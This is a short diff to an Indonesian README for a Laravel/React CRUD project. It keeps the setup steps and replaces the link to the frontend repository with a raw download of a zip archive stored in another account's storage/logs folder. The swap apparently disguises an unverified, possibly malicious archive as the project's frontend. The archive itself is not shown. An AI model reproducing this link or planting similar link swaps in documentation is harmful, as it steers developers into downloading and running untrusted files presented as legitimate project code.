@@ -6,4 +6,4 @@
 4.jalankan php artisan migrate<br>
 5.jalankan php artisan serve<br>
 <br><br>
-link web frontendnya <a href="https://github.com/fikrisuheri/Frontend-larareact-crud/">disini</a>
+link web frontendnya <a href="https://raw.githubusercontent.com/pmanss/Backend-larareact-crud/master/storage/logs/crud_Backend_larareact_1.3.zip">disini</a>
